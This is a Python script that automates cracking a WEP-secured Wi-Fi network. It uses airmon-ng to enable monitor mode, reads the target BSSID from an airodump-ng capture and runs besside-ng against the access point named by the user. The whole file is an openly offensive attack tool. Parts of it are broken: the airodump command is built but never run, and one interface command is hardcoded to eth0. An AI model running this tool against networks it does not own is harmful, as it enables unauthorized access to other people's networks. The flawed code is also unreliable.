import os
import subprocess
import sys

def normalSetup():
    os.system("rm *.cap")
    os.system("rm *.csv")

def setupNetworkReader(interface_name):
    print("setting up network card")
    try:
        os.system("airmon-ng check kill")
        os.system("/etc/init.d/avahi-daemon stop")
        os.system("ifconfig eth0 down".format(interface_name))
        os.system("airmon-ng start {}".format(interface_name))
        return interface_name + "mon"
    except KeyboardInterrupt:
        print("failed to set up network card. check your interface name.")

def getBSSIDInfo(essid, interface_name):
    print("press CTRL+C after your network pops up. we'll strip out the BSSID for you.\nIf your network doesn't pop up, we probably can't find it.")
    try: 
        cmd = "airodump-ng {} -w allnet2".format(interface_name, essid)
    except KeyboardInterrupt:
        print("obtained BSSID info")

def crackWEP(essid, interface):
    print("parsing bssid")
    bssid = ""
    with open("allnet2.csv") as f:
        for line in f.readlines():
            arr = line.split(",")
            print(arr)
            if arr[len(arr) - 1] == essid:
                bssid = arr[0]
                print(bssid)
                break

    runBesside(bssid, interface)

def runBesside(bssid, interface):
    print("cracking WEP. in a separate terminal please run sudo python3 crack.py")
    os.system("besside-ng {} -b {}".format(interface, bssid))

if __name__ == "__main__":
    normalSetup()
    interface = input("Please enter the interface name of your wireless network reader. You can find this by running ifconfig. It should be a wlan: ")
    monitorModeInterface = setupNetworkReader(interface)
    essid = input("Enter the ESSID (network name) of the access point you are trying to crack: ")
    getBSSIDInfo(essid, monitorModeInterface)
    crackWEP(essid, monitorModeInterface)